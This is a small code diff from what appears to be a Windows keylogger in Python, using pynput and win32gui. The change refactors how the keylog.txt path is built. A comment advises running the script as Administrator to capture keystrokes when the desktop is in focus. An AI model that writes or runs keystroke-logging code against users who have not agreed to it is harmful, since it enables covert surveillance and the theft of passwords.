@@ -2,13 +2,16 @@ import logging
 import datetime
 import os
 from pynput import keyboard
+from pathlib import Path
 import win32gui  #interacting with the windows gui
 
 
 # config
 # On Windows: to capture keys when the DESKTOP has focus, run this script as Administrator
 # (UIPI blocks low-level hooks for non-elevated processes when Explorer/Desktop is foreground).
-LOG_FILE = os.path.join(os.path.dirname(__file__), "keylog.txt")
+
+BASE_DIR = Path(__file__).resolve().parent
+LOG_FILE = BASE_DIR / "keylog.txt"
 
 # setup logging
 logging.basicConfig(
